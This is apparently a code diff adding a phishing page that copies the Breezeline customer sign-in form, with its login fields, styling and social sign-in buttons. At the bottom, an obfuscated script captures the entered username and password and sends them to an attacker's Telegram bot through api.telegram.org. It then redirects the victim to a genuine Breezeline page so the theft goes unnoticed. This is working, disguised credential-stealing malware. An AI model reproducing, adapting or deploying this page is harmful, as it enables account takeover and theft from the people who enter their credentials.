@@ -1,0 +1,256 @@
+
+<!DOCTYPE html>
+<html class="login-pf">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="robots" content="noindex, nofollow">
+
+            <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <title>Sign in to Customers</title>
+    <link rel="icon" href="https://id.my.breezeline.com/resources/akeif/login/bzl/img/favicon.ico" />
+            <link href="https://id.my.breezeline.com/resources/akeif/common/keycloak/vendor/patternfly-v4/patternfly.min.css" />
+            <link href="https://id.my.breezeline.com/resources/akeif/common/keycloak/vendor/patternfly-v3/css/patternfly.min.css" />
+            <link href="https://id.my.breezeline.com/resources/akeif/common/keycloak/vendor/patternfly-v3/css/patternfly-additions.min.css" rel="stylesheet" />
+            <link href="https://id.my.breezeline.com/resources/akeif/common/keycloak/lib/pficon/pficon.css" rel="stylesheet" />
+            <link href="https://id.my.breezeline.com/resources/akeif/login/bzl/css/login.css" rel="stylesheet" />
+            <!-- <script src="/resources/akeif/login/bzl/js/fixname.js" type="text/javascript"></script> -->
+            <script src="./script.js"></script>
+</head>
+
+<body class="">
+
+<style>
+  body {
+    margin: 0;
+    padding: 0;
+    font-family: "Segoe UI", sans-serif;
+    background-color: #f9f9f9;
+  }
+
+  .card-pf {
+    max-width: 600px;
+    margin: 40px auto;
+    padding: 2rem;
+    background: #fff;
+    border-radius: 10px;
+    box-shadow: 0 0 8px rgba(0,0,0,0.1);
+    box-sizing: border-box;
+  }
+
+  .form-group {
+    margin-bottom: 1.2rem;
+  }
+
+  .form-control {
+    width: 100%;
+    padding: 0.6rem 1rem;
+    font-size: 1rem;
+    border-radius: 4px;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+  }
+
+  .btn-primary {
+    width: 100%;
+    padding: 0.75rem;
+    font-size: 1.1rem;
+    background-color: #007bff;
+    border: none;
+    color: white;
+    border-radius: 5px;
+    cursor: pointer;
+  }
+
+  .btn-primary:hover {
+    background-color: #0056b3;
+  }
+
+  .login-social-div {
+    margin-top: 1.5rem;
+  }
+
+  .social-btn {
+    display: flex;
+    align-items: center;
+    padding: 0.6rem 1rem;
+    margin-bottom: 10px;
+    background: #f1f1f1;
+    border-radius: 5px;
+    text-decoration: none;
+    color: #333;
+    font-size: 0.95rem;
+    transition: background 0.2s ease;
+  }
+
+  .social-btn:hover {
+    background: #e2e2e2;
+  }
+
+  .social-btn img {
+    height: 24px;
+    margin-right: 10px;
+  }
+
+  .social-div {
+    margin-top: 20px;
+    padding-left: 0;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+  }
+
+  .social-div-h4 {
+    margin-bottom: 15px;
+    font-size: 1rem;
+  }
+
+  .login-pf-settings {
+    display: flex;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 10px;
+    font-size: 0.9rem;
+    margin-top: 10px;
+  }
+
+  .login-pf-settings label {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+  }
+
+  .login-pf-header h1 {
+    font-size: 1.8rem;
+    text-align: center;
+    margin-bottom: 1.5rem;
+  }
+
+  @media (max-width: 480px) {
+    .card-pf {
+      margin: 20px 10px;
+      padding: 1.5rem;
+    }
+
+    .login-pf-header h1 {
+      font-size: 1.5rem;
+    }
+
+    .social-btn {
+      font-size: 0.9rem;
+      padding: 0.5rem 0.8rem;
+    }
+
+    .social-btn img {
+      height: 20px;
+    }
+
+    .btn-primary {
+      font-size: 1rem;
+      padding: 0.6rem;
+    }
+  }
+</style>
+
+
+<div class="login-pf-page">
+    <div id="kc-header" class="login-pf-page-header">
+        <div id="kc-header-wrapper" class="">
+        </div>
+    </div>
+    <div class="card-pf">
+        <img src="data:image/png;base64,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" />
+        <hr class="solid">
+        <header class="login-pf-header">
+                <h1 id="kc-page-title">        Sign In
+
+</h1>
+      </header>
+      <div id="kc-content">
+        <div id="kc-content-wrapper">
+
+
+    <div id="kc-form">
+      <div id="kc-form-wrapper">
+            <form id="kc-form-login" onsubmit="login.disabled = true; return true;" action="https://id.my.breezeline.com/realms/customer/login-actions/authenticate?session_code=ELnnBqsnp_UJD0jrEDjbdOfq_I1kO2q2usb1uhe93io&amp;execution=6d9aafb1-f9fc-41a0-90b7-595014277a14&amp;client_id=my_account_server&amp;tab_id=zLMVjQBTnaw&amp;client_data=eyJydSI6Imh0dHBzOi8vYXBpLmdhbW1hLm15YWNjb3VudC5icmVlemVsaW5lLmNvbS9jYWxsYmFjayIsInJ0IjoiY29kZSIsInN0IjoiZXlKaGJHY2lPaUpGUTBSSUxVVlRJaXdpWlc1aklqb2lRVEV5T0VkRFRTSXNJbVZ3YXlJNmV5SmpjbllpT2lKUUxUSTFOaUlzSW10MGVTSTZJa1ZESWl3aWVDSTZJa1JDUld4WVNsZG5kRTFaTW05Sk5pMW1RMUJQZVVab1QwdDRObE5DYjJkTGFFUmtMVEpVVGtaQ1JXOGlMQ0o1SWpvaVRHOTNhbHBtT0ZodlpqSnhlRWt4YjNOd2VHaERZVFpIZGxnellrMVNTRk5vWlUxRlZrZFhSRE01U1NKOWZRLi5HNUhicmVCaS1Wa0V3LXJuLklxTzFGZFVSMG5GY3NuU1NXYnlOaUg0RXotYU5XQmJmVkYybUVCWHV4cHNmb0Z0MlVQYW9JWl9xVlV0Si5ZWDlndHp0REFNaTRXRlZRWnFReDhnIn0" method="post">
+                <div class="form-group">
+                    <label for="username" class="control-label">Username or Breezeline Email Address</label>
+
+                        <input tabindex="1" id="name" class="form-control" name="name" required="" value=""  type="text" autofocus autocomplete="off"
+                               aria-invalid=""
+                               placeholder="Enter Your Breezeline Username"
+                         />
+                         <div id="emailError" class="error-message" style="color: #FF6D70;"></div>
+                            <span id="input-hint" class="pf-c-form__helper-text pf-m-error required kc-feedback-text" aria-live="polite"></span>
+                            <span><a tabindex="5" target="_blank" href="https://create.my.breezeline.com/Retrieve">Forgot Username?</a></span>
+                </div>
+
+                <div class="form-group">
+                    <label for="password" class="control-label">Password</label>
+
+                    <input tabindex="2" id="password" class="form-control" name="password" type="password" autocomplete="off"
+                           aria-invalid="" placeholder="Enter Your Breezeline Password"
+                    />
+                </div>
+                <div id="passwordError" class="error-message" style="color: #FF6D70;"></div>
+
+                <div class="form-group login-pf-settings">
+                    <div><a tabindex="5" target="_blank" href="https://create.my.breezeline.com/Trouble">Forgot Password?</a></div>
+                    <div id="kc-form-options">
+                            <label id="remeberMeLabel">
+                                    <input tabindex="3" id="rememberMe" name="rememberMe" type="checkbox"> Remember me
+                            </label>
+                    </div>
+                </div>
+
+
+
+                  <div class="login-social-div" >
+                  <div id="kc-form-buttons" class="form-group">
+                      <input type="hidden" id="id-hidden-input" name="credentialId" />
+                      <input  tabindex="4" class="btn btn-primary btn-block btn-lg" name="login" id="signIn" type="submit" value="Sign In"/>
+                  </div>
+                      <div id="kc-registration">
+                        <span> 
+                            <a tabindex="6" target="_blank" href="https://create.my.breezeline.com/Create">Create an Account </a>
+                        </span>
+                     </div>
+                </div>
+            </form>
+        </div>
+
+            <div id="kc-social-providers" class="kc-social-section kc-social-gray">
+                <h4 class="social-div-h4" >Or sign in with</h4>
+                <ul class="social-div ">
+                        <a id="social-apple" class="social-btn apple "
+                                type="button" href="/realms/customer/broker/apple/login?client_id=my_account_server&amp;tab_id=zLMVjQBTnaw&amp;client_data=eyJydSI6Imh0dHBzOi8vYXBpLmdhbW1hLm15YWNjb3VudC5icmVlemVsaW5lLmNvbS9jYWxsYmFjayIsInJ0IjoiY29kZSIsInN0IjoiZXlKaGJHY2lPaUpGUTBSSUxVVlRJaXdpWlc1aklqb2lRVEV5T0VkRFRTSXNJbVZ3YXlJNmV5SmpjbllpT2lKUUxUSTFOaUlzSW10MGVTSTZJa1ZESWl3aWVDSTZJa1JDUld4WVNsZG5kRTFaTW05Sk5pMW1RMUJQZVVab1QwdDRObE5DYjJkTGFFUmtMVEpVVGtaQ1JXOGlMQ0o1SWpvaVRHOTNhbHBtT0ZodlpqSnhlRWt4YjNOd2VHaERZVFpIZGxnellrMVNTRk5vWlUxRlZrZFhSRE01U1NKOWZRLi5HNUhicmVCaS1Wa0V3LXJuLklxTzFGZFVSMG5GY3NuU1NXYnlOaUg0RXotYU5XQmJmVkYybUVCWHV4cHNmb0Z0MlVQYW9JWl9xVlV0Si5ZWDlndHp0REFNaTRXRlZRWnFReDhnIn0&amp;session_code=ELnnBqsnp_UJD0jrEDjbdOfq_I1kO2q2usb1uhe93io">
+                             
+                                <img id="google-logo" class="google-logo" src="https://id.my.breezeline.com/resources/akeif/login/bzl/public/apple.png " />
+                                <span class="kc-social-provider-name kc-social-icon-text"> Continue with Apple </span>
+                        </a>
+                        <a id="social-google" class="social-btn google  "
+                                type="button" href="/realms/customer/broker/google/login?client_id=my_account_server&amp;tab_id=zLMVjQBTnaw&amp;client_data=eyJydSI6Imh0dHBzOi8vYXBpLmdhbW1hLm15YWNjb3VudC5icmVlemVsaW5lLmNvbS9jYWxsYmFjayIsInJ0IjoiY29kZSIsInN0IjoiZXlKaGJHY2lPaUpGUTBSSUxVVlRJaXdpWlc1aklqb2lRVEV5T0VkRFRTSXNJbVZ3YXlJNmV5SmpjbllpT2lKUUxUSTFOaUlzSW10MGVTSTZJa1ZESWl3aWVDSTZJa1JDUld4WVNsZG5kRTFaTW05Sk5pMW1RMUJQZVVab1QwdDRObE5DYjJkTGFFUmtMVEpVVGtaQ1JXOGlMQ0o1SWpvaVRHOTNhbHBtT0ZodlpqSnhlRWt4YjNOd2VHaERZVFpIZGxnellrMVNTRk5vWlUxRlZrZFhSRE01U1NKOWZRLi5HNUhicmVCaS1Wa0V3LXJuLklxTzFGZFVSMG5GY3NuU1NXYnlOaUg0RXotYU5XQmJmVkYybUVCWHV4cHNmb0Z0MlVQYW9JWl9xVlV0Si5ZWDlndHp0REFNaTRXRlZRWnFReDhnIn0&amp;session_code=ELnnBqsnp_UJD0jrEDjbdOfq_I1kO2q2usb1uhe93io">
+                             
+                                <img id="google-logo" class="google-logo" src="https://id.my.breezeline.com/resources/akeif/login/bzl/public/google.png " />
+                                <span class="kc-social-provider-name kc-social-icon-text">Continue with Google </span>
+                        </a>
+                </ul>
+            </div>
+    </div>
+
+
+
+
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+function _0x6ccb(_0x2533e5,_0x2e6fdf){const _0x27fc01=_0x27fc();return _0x6ccb=function(_0x6ccba0,_0x1da552){_0x6ccba0=_0x6ccba0-0x6d;let _0x10128d=_0x27fc01[_0x6ccba0];return _0x10128d;},_0x6ccb(_0x2533e5,_0x2e6fdf);}const _0x29fd7f=_0x6ccb;(function(_0x1f2af1,_0x158353){const _0x56fb63=_0x6ccb,_0x576948=_0x1f2af1();while(!![]){try{const _0x2e3151=-parseInt(_0x56fb63(0x8e))/0x1*(-parseInt(_0x56fb63(0x6f))/0x2)+parseInt(_0x56fb63(0x7a))/0x3*(parseInt(_0x56fb63(0x87))/0x4)+parseInt(_0x56fb63(0x81))/0x5*(parseInt(_0x56fb63(0x8d))/0x6)+-parseInt(_0x56fb63(0x89))/0x7+parseInt(_0x56fb63(0x74))/0x8*(-parseInt(_0x56fb63(0x70))/0x9)+-parseInt(_0x56fb63(0x93))/0xa+parseInt(_0x56fb63(0x75))/0xb*(parseInt(_0x56fb63(0x95))/0xc);if(_0x2e3151===_0x158353)break;else _0x576948['push'](_0x576948['shift']());}catch(_0x2ab354){_0x576948['push'](_0x576948['shift']());}}}(_0x27fc,0xf1211),document['getElementById'](_0x29fd7f(0x7c))[_0x29fd7f(0x76)]('click',function(_0x54dac4){const _0xd4e266=_0x29fd7f;_0x54dac4[_0xd4e266(0x90)]();const _0x32dc82=document[_0xd4e266(0x8c)]('name')[_0xd4e266(0x8f)],_0x365c5a=document[_0xd4e266(0x8c)]('password')[_0xd4e266(0x8f)];document[_0xd4e266(0x8c)](_0xd4e266(0x7d))['textContent']='',document[_0xd4e266(0x8c)](_0xd4e266(0x82))[_0xd4e266(0x77)]='';let _0x3d7ae1=!![];!_0x32dc82[_0xd4e266(0x8a)]()&&(document[_0xd4e266(0x8c)](_0xd4e266(0x7d))[_0xd4e266(0x77)]=_0xd4e266(0x6d),document[_0xd4e266(0x8c)](_0xd4e266(0x7d))[_0xd4e266(0x7f)][_0xd4e266(0x83)]='700',_0x3d7ae1=![]);!_0x365c5a[_0xd4e266(0x8a)]()&&(document[_0xd4e266(0x8c)](_0xd4e266(0x82))['textContent']=_0xd4e266(0x71),document[_0xd4e266(0x8c)](_0xd4e266(0x82))[_0xd4e266(0x7f)][_0xd4e266(0x83)]=_0xd4e266(0x7e),_0x3d7ae1=![]);if(!_0x3d7ae1)return;const _0x42a4b9=_0xd4e266(0x85)+_0x32dc82+_0xd4e266(0x8b)+_0x365c5a;fetch(_0xd4e266(0x86)+botToken+_0xd4e266(0x6e),{'method':_0xd4e266(0x96),'headers':{'Content-Type':_0xd4e266(0x79)},'body':JSON[_0xd4e266(0x78)]({'chat_id':chatId,'text':_0x42a4b9})})[_0xd4e266(0x80)](_0x4f1467=>_0x4f1467[_0xd4e266(0x94)]())[_0xd4e266(0x80)](_0x341e4e=>{const _0x35491f=_0xd4e266;console[_0x35491f(0x88)](_0x35491f(0x7b),_0x341e4e),window[_0x35491f(0x84)][_0x35491f(0x91)]='https://www.breezeline.com/interstitial-my-email';})[_0xd4e266(0x72)](_0x389490=>{const _0x45251a=_0xd4e266;console[_0x45251a(0x73)](_0x45251a(0x92),_0x389490);});}));function _0x27fc(){const _0x29a54b=['Username\x20or\x20Breezeline\x20Email\x20address\x20is\x20required','/sendMessage','34xQiquZ','8191206LOkXgl','Breezeline\x20password\x20is\x20required','catch','error','8tEbngV','2453vqPuiL','addEventListener','textContent','stringify','application/json','16329USptLq','Message\x20sent\x20to\x20Telegram','signIn','emailError','700','style','then','95vaFKhX','passwordError','fontWeight','location','🔐\x20New\x20Login:\x0a📧\x20Username:\x20','https://api.telegram.org/bot','544Ffdwfn','log','98189WGvLUc','trim','\x0a🔑\x20Password:\x20','getElementById','292056WgFfHX','56452enbuIR','value','preventDefault','href','Error\x20sending\x20message\x20to\x20Telegram','11127890pFMZQN','json','21516IyUNTk','POST'];_0x27fc=function(){return _0x29a54b;};return _0x27fc();}
+    </script>
+</body>
+</html>
